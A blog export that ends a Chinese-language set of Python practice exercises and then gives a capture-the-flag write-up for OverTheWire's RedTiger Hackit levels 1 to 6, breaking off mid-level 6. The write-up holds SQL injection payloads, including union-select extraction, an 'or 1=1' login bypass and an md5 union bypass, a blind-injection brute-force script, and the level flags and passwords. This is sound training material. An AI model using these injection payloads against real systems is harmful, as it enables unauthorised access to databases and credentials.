<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>]</span><br><span class="line">nums.remove(<span class="number">24</span>)</span><br><span class="line"><span class="built_in">print</span>(nums)</span><br></pre></td></tr></table></figure>
<h1 id="question-93">3. Question 93</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定两个列表 [12,24,35,70,88,120,155] 和
[1,3,6,78,35,55]，得到一个新的列表，该列表的元素为两个列表的交集中的所有元素</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">population1 = <span class="built_in">set</span>([<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>])</span><br><span class="line">population2 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">78</span>, <span class="number">35</span>, <span class="number">55</span>])</span><br><span class="line">res = <span class="built_in">list</span>(population1 &amp; population2)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h2 id="set">3.1. set()</h2>
<h3 id="基础知识">3.1.1. 基础知识</h3>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>(iterable)</span><br></pre></td></tr></table></figure>
<ul>
<li>iterable：可迭代对象</li>
</ul>
<p>作用：</p>
<ul>
<li>将可迭代对象去重，然后将剩下的元素组成 set 对象</li>
</ul>
<p>返回值：</p>
<ul>
<li>set 对象，是一个可迭代对象</li>
</ul>
<h3 id="高级使用">3.1.2. 高级使用</h3>
<p>可以用来求：交集、并集、差集、补集。假设给定两个列表
[12,24,35,70,88,120,155] 和 [1,3,6,78,35,55]：</p>
<ol type="1">
<li><p>交集：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">population1 = <span class="built_in">set</span>([<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>])</span><br><span class="line">population2 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">78</span>, <span class="number">35</span>, <span class="number">55</span>])</span><br><span class="line">res = population1 &amp; population2</span><br></pre></td></tr></table></figure></li>
<li><p>并集：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">population1 = <span class="built_in">set</span>([<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>])</span><br><span class="line">population2 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">78</span>, <span class="number">35</span>, <span class="number">55</span>])</span><br><span class="line">res = population1 | population2</span><br></pre></td></tr></table></figure></li>
<li><p>差集：（谁在前、谁在后不一样）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">population1 = <span class="built_in">set</span>([<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>])</span><br><span class="line">population2 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">78</span>, <span class="number">35</span>, <span class="number">55</span>])</span><br><span class="line">res1 = population1 - population2 <span class="comment"># 返回包含 population1 中存在，population2 中不存在的元素</span></span><br><span class="line">res2 = population2 - population1 <span class="comment"># 返回包含 population2 中存在，population1 中不存在的元素</span></span><br></pre></td></tr></table></figure></li>
<li><p>（交集的）补集：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">population1 = <span class="built_in">set</span>([<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>])</span><br><span class="line">population2 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">78</span>, <span class="number">35</span>, <span class="number">55</span>])</span><br><span class="line">res = population1 ^ population2 <span class="comment"># 返回包含 population1 和 population2 中非交集的元素</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="question-94">4. Question 94</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>给定一个列表：[12,24,35,24,88,120,155,88,120,155]，去重并且保证相对顺序不变</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">24</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>]</span><br><span class="line">res = <span class="built_in">list</span>(<span class="built_in">set</span>(lst)) <span class="comment"># 去重，但改变顺序</span></span><br><span class="line">res.sort(key=lst.index) <span class="comment"># 按照原来的下标进行排序</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="question-95">5. Question 95</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>定义一个类 Person，以及它的两个子类 Male 和 Female，所有类都拥有
getGender 方法，如果是 Male 则打印 Male，Female 则打印 Female</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getGender</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Male</span>:</span></span><br><span class="line">    gender = <span class="string">&#x27;Male&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getGender</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(cls.gender)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Female</span>:</span></span><br><span class="line">    gender = <span class="string">&#x27;Female&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getGender</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(cls.gender)</span><br><span class="line">        </span><br><span class="line">jack = Male()</span><br><span class="line">tina = Female()</span><br><span class="line">jack.getGender()</span><br><span class="line">tina.getGender()</span><br></pre></td></tr></table></figure>
<ul>
<li>这里使用了类方法和类属性</li>
</ul>
<h1 id="question-96">6. Question 96</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>给定一个字符串，统计每个字符出现的次数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    res[c] = <span class="built_in">str</span>.count(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> res.keys():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>,<span class="subst">&#123;res.get(key)&#125;</span>&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="str.count">6.1. str.count()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>.count(sub, start=<span class="number">0</span>, end=<span class="built_in">len</span>(string))</span><br></pre></td></tr></table></figure>
<ul>
<li>sub：要搜索的子串</li>
<li>start：起始位置，默认为主串中的第一个字符</li>
<li>end：结束位置，默认为主串的长度，因此搜索范围为 [start, end)</li>
</ul>
<p>作用：</p>
<ul>
<li>统计 sub 在主串中出现的次数</li>
</ul>
<p>返回值：</p>
<ul>
<li>出现的次数</li>
</ul>
<h1 id="question-97">7. Question 97</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>输入为一个字符串，将其倒序输出</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<h1 id="question-98">8. Question 98</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>输入为一个字符串，输出其中下标为偶数的部分</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<h1 id="question-99">9. Question 99</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>给定一个列表，打印出所有可能的排列。使用
itertools.permutations()</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(itertools.permutations([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])))</span><br></pre></td></tr></table></figure>
<h2 id="itertools.permutations">9.1. itertools.permutations()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">itertools.permutations(iterable, r=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>r 如果没有指定，默认使用 None，即 iterable 的长度</li>
</ul>
<p>作用：</p>
<ul>
<li>返回由 iterable 元素组成的长度为 r
的全排列，返回值为一个可迭代对象</li>
</ul>
<h2 id="itertools.combinations">9.2. itertools.combinations()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">itertools.combinations(iterable, r)</span><br></pre></td></tr></table></figure>
<ul>
<li>r 必须指定</li>
</ul>
<p>作用：</p>
<ul>
<li>返回由 iterable 元素组成的长度为 r
的全排列，返回值为一个可迭代对象。</li>
</ul>
<h1 id="question-100">10. Question 100</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>鸡兔同笼，假设共有 35 个头，94
条腿，计算鸡和兔子的数量分别是多少？</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">heads = <span class="number">35</span></span><br><span class="line">legs = <span class="number">94</span></span><br><span class="line"><span class="keyword">for</span> chicken_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, heads+<span class="number">1</span>):</span><br><span class="line">    rabbit_num = heads - chicken_num</span><br><span class="line">    total_leg = <span class="number">2</span> * chicken_num + <span class="number">4</span> * rabbit_num</span><br><span class="line">    <span class="keyword">if</span> total_leg == legs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;the number of chickens is: <span class="subst">&#123;chicken_num&#125;</span>, and the number of rabbits is: <span class="subst">&#123;rabbit_num&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Redtiger_Hackit_WriteUp</title>
    <url>/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/</url>
    <content><![CDATA[<p>网站：https://redtiger.labs.overthewire.org/</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png" /></p>
<span id="more"></span>
<h1 id="level-1">Level-1</h1>
<h2 id="题目描述">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152754.png" /></p>
<p>点击 <code>1</code> 发现 url 出现 <code>cat=1</code>
，并且页面出现了一些变化 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152853.png" /></p>
<p>url: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1</span><br></pre></td></tr></table></figure></p>
<h2 id="测试注入点">测试注入点</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=1=1</span><br><span class="line">?cat=1=2</span><br></pre></td></tr></table></figure>
<p>如上 payload，后者出现
<code>This category does not exist!</code>，而前者正常，说明存在注入点，并且为数字型，即没有闭合方式。</p>
<h2 id="注入过程">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试多少列：?cat=1 order by 4</span><br><span class="line">2. 测试显示位：?cat=-1 union select 1,2,3,4</span><br><span class="line">3. 测得数据库为hackit：?cat=-1 union select 1,2,3,database()</span><br></pre></td></tr></table></figure>
<p>如果按照常规的显示表、列会出现
<code>Some things are disabled!!!</code>
也就是被过滤了。但是考虑到表名给我们了，并且根据描述，可以猜测表内有<code>username, password</code>
两个字段。因此构造如下paylaod： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=-1 union select 1,2,username,password from level1_users</span><br></pre></td></tr></table></figure></p>
<p>得到用户名为：Hornoxe，密码为：thatwaseasy。成功登录：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme</span><br></pre></td></tr></table></figure></p>
<p>可以到wechall上提交flag，网址：https://www.wechall.net/14-levels-on-Hackit.html</p>
<h1 id="level-2">Level-2</h1>
<h2 id="题目描述-1">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318153929.png" /></p>
<p>根据描述，这道题是登录绕过。</p>
<h2 id="测试注入点-1">测试注入点</h2>
<p>分别对username和password测试，结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure> 对应：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154813.png" /></p>
<p>而 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>对应： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154617.png" /></p>
<p>因此注入点应该在password。</p>
<p>并且 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>则不出现报错信息，只出现
<code>login incorrect!</code>。这就更加确定password为注入点。</p>
<h2 id="注入过程-1">注入过程</h2>
<p>本题为登录绕过，因此尝试万能密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27; or 1=1#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现成功登录： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154759.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: feed_the_cat_who_eats_your_bread</span><br></pre></td></tr></table></figure>
<h1 id="level-3">Level-3</h1>
<h2 id="题目描述-2">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154944.png" /></p>
<p>本题很有难度，注意提示 <code>try to get an error</code>。点击
<code>TheCow</code> 和 <code>Admin</code> url会出现 <code>usr</code>
参数，但是不乱是 <code>1=1</code> 还是 <code>1=2</code>
或者加单引号都不起作用，并且将原来的usr经过base64解码后得到的也只是一串数字，跟TheCow和Admin无法对上。查看大佬的writeup之后发现，需要<strong>传入数组让它报错</strong>！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318155401.png" /></p>
<p>注意 <code>/var/www/html/hackit/urlcrypt.inc</code>
，这是一个文件，输入网址：<code>http://redtiger.labs.overthewire.org/urlcrypt.inc</code>
并且查看源码得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">	<span class="comment">// requires php5.x, sorry for that</span></span><br><span class="line">  		</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">					<span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>注意前面的提示，代码只能运行在PHP5.x
版本，太高或者太低的版本会导致最终的加密结果不对！！！</p>
<h2 id="测试注入点-2">测试注入点</h2>
<p>推荐网址，可以选择php版本：http://www.dooccn.com/php5.5/</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160027.png" /></p>
<p>将点击Admin之后得到的usr的值代入解密发现结果正好是Admin，因此得出结论，usr就是注入点，并且需要将payload经过加密后再传入。将
<code>Admin'</code> 加密后传入，发现报错，而 <code>Admin'#</code>
加密后传入正常显示。因此闭合方式为单引号。</p>
<h2 id="注入过程-2">注入过程</h2>
<p>首先，表名已经给了，为：<code>level3_users</code>，需要获得Admin的密码，猜测字段名为：<code>password</code>。（这个网站的字段名都比较正常）因此构造payload：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?usr=Admin&#x27; order by 7#  </span><br><span class="line">加密后：MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?usr=&#x27; union select 1,2,3,4,5,6,7# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160839.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">得到密码：?usr=&#x27; union select 1,2,3,4,5,6,password from level3_users wehre username=&#x27;admin&#x27;# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMTQwMjI4MDYzMTk4MTM1MTA3MTA2MTgwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTU4MjIwMDcxMDQwMjIwMjA5MDMz</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161210.png" /></p>
<p>注意登录的时候，Username为admin，不要大写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca</span><br><span class="line"></span><br><span class="line">The password for the next level is: put_the_kitten_on_your_head</span><br></pre></td></tr></table></figure>
<h1 id="level-4">Level-4</h1>
<h2 id="题目描述-3">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161335.png" /></p>
<p>发现给出了表名为：level4_secret， 字段名为：keyword，并且过滤了
like。</p>
<p>点击 <code>Click me</code>，url出现id=1。</p>
<h2 id="测试注入点-3">测试注入点</h2>
<p>分别用 <code>?id=1=1</code> 和 <code>?id=1=2</code>
测试，分别对应如下的结果：</p>
<ul>
<li>前者提示为：<code>Query returned 1 rows.</code></li>
<li>后者提示为：<code>Query returned 0 rows.</code></li>
</ul>
<p>因此为数字型的注入点。</p>
<h2 id="注入过程-3">注入过程</h2>
<p>注意本题是盲注。并且如果判断错误将会出现提示<code>Query returned 0 rows.</code>，而判断正确则会出现<code>Query returned 1 rows.</code>或者<code>Query returned 2 rows.</code>。因此根据错误的提示不同可以先测试以下word的长度为多少。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and length((select keyword from level4_secret limit 0,1))=21</span><br></pre></td></tr></table></figure></p>
<p>不断修改后面的值，发现长度为21，因此编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">url = <span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php&#x27;</span>  </span><br><span class="line">header = &#123;  </span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">payload = <span class="string">&#x27;1 and ascii(substr((select keyword from level4_secret limit 0,1),%d,1))=%d&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">22</span>):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  </span><br><span class="line">        param = &#123;  </span><br><span class="line">            <span class="string">&quot;id&quot;</span>: payload % (i, j)  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.get(url, params=param, headers=header)  </span><br><span class="line">        time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Query returned 0 rows&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line"> flag += <span class="built_in">chr</span>(j)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
（本题需要注意，每次通过都会给一个<code>The password for the next level is:xxx</code>
这是用来登录的，会保存在cookie中，所以要在脚本中添加cookie，否则无法访问。可以抓包查看cookie）</p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">killstickswithbr1cks!</span><br></pre></td></tr></table></figure></p>
<p>成功注入。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa</span><br><span class="line"></span><br><span class="line">The password for the next level is: this_hack_it&#x27;s_old</span><br></pre></td></tr></table></figure></p>
<h1 id="level-5">Level-5</h1>
<h2 id="题目描述-4">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318165905.png" /></p>
<p>本题也是登录绕过，并且存在过滤，而且密码是经过md5加密的。</p>
<h2 id="测试注入点-4">测试注入点</h2>
<p>分别使用： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. username=1&#x27;&amp;password=1&amp;login=Login</span><br><span class="line">2. username=1&#x27;#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/hackit/level5.php</span><br></pre></td></tr></table></figure></p>
<p>而后者没有，说明 username为注入点，并且闭合方式为单引号。</p>
<h2 id="注入过程-4">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：username=1&#x27; order by 2#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure>
<p>本题是登录绕过，所以优先尝试 <code>1' or 1=1#</code>
发现无法登录。又因为字段数为2，因此做一个猜测（这很重要，很多情况都需要猜测）：</p>
<blockquote>
<p>这两个字段一个是username，另一个是password。根据输入的username，去数据库查询是否存在该用户，如果存在该用户则返回username和password，然后将返回的password和输入的password进行对比，如果一样则登录成功，否则登陆失败。</p>
</blockquote>
<p>根据这猜测，那么我们随便查询一个不存在的用户，这样子就没有返回的结果。然后联合查询，密码字段为<code>md5(number)</code>，这样子就会返回一个结果，其中密码字段为
<code>md5(number)</code> 。如果输入的password为 <code>number</code>
，则md5加密后会与返回结果中的密码一致，从而登陆成功。所以构造如下payload：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select 1,md5(1)#&amp;password=1&amp;login=Login</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">username: 1&#x27; union select 1,md5(1)#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure></p>
<p>需要注意两点： 1. 上面所述的 number 要一样； 2.
要得到password所在的位置，要么第一个，要么第二个，尝试两次就出来了；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: the_stone_is_cold</span><br></pre></td></tr></table></figure>
<h1 id="level-6">Level-6 ⭐</h1>
<h2 id="题目描述-5">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318171918.png" /></p>
<p>点击 <code>Click me</code> 发现url出现变化，多了一个
<code>user</code> 参数。</p>
<h2 id="测试注入点-5">测试注入点</h2>
<p>分别使用 <code>?user=1=1</code> 和 <code>?user=1=2</code>
进行测试，发现前者出现报错，而后者没有报错，因此user为数字型注入点。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172316.png" /></p>
<p><img
